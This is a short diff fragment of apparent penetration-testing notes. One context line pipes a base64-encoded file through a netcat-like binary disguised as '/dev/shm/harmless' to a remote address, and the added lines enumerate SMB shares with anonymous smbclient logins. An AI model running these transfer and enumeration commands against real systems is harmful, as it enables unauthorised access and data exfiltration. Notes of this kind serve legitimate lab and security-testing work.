@@ -45,3 +45,8 @@ base64 filename.wav | /dev/shm/harmless -w 3 10.10.0.1 1235
 Local:
 md5sum filename.wav
 
+Windows Machines
+============================
+smbclient -L 10.10.10.123
+smbclient //MOUNT/share -I target -N
+
